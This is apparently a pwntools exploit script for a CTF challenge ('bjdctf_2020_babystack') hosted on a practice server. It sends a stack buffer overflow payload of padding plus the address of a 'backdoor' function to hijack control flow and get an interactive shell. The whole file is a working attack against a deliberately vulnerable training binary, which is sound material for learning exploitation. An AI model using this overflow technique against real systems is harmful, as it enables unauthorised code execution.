#!/usr/bin/python3.6
from pwn import *

filename = './bjdctf_2020_babystack'
elf = ELF(filename)
# p = process(filename)
p = remote("node3.buuoj.cn", 27571)

log.info(f'backdoor={hex(elf.sym["backdoor"])}')

payload = b'a' * (0x10+8) + p64(elf.sym["backdoor"])

p.recvuntil(b'Please input the length of your name:')
p.sendline(str(len(payload)))

p.recvuntil(b"What's u name?")
p.sendline(payload)

p.interactive()
